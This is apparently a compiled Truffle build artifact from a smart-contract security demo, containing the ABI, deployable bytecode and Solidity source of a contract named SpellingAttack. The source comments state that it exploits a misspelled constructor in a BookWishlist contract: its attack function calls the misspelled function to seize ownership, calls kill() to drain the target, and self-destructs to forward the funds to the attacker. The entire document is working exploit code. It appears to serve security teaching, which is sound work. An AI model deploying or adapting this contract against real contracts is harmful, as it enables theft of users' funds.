{
  "contractName": "SpellingAttack",
  "abi": [
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_t",
          "type": "address"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    }
  ],
  "bytecode": "0x60606040526040516020806102a383398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101f2806100b16000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639e5faafc14610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d86f0d566040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15156100df57600080fd5b6102c65a03f115156100f057600080fd5b5050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166341c0e1b56040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561017757600080fd5b6102c65a03f1151561018857600080fd5b505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820c3e71fe935bdf8c5661e6b3793bcb7258bbbdc02821cf50512a3cfe43436262e0029",
  "source": "pragma solidity ^0.4.18;\n\nimport \"./BookWishlist.sol\";\n\n/*\n * This contract is constructed to take advantage of a spelling\n * mistake in the BookWishlist constructor. It allows an attacker\n * to take ownership of the contract, drain it and steal the funds.\n */\ncontract SpellingAttack {\n    BookWishlist target;\n    address owner;\n\n    function SpellingAttack(address _t) public payable {\n        target = BookWishlist(_t);\n        owner = msg.sender;\n    }\n\n    // Exploit misspelled contructor, steal funds and forward to owner\n    function attack() public {\n        target.BookWishlit();\n        target.kill();\n        selfdestruct(owner);\n    }\n}\n",
  "sourcePath": "/Users/Chase/security/ExampleDapp/contracts/SpellingAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
  },
  "schemaVersion": "1.0.1",
  "updatedAt": "2017-12-14T00:58:23.977Z"
}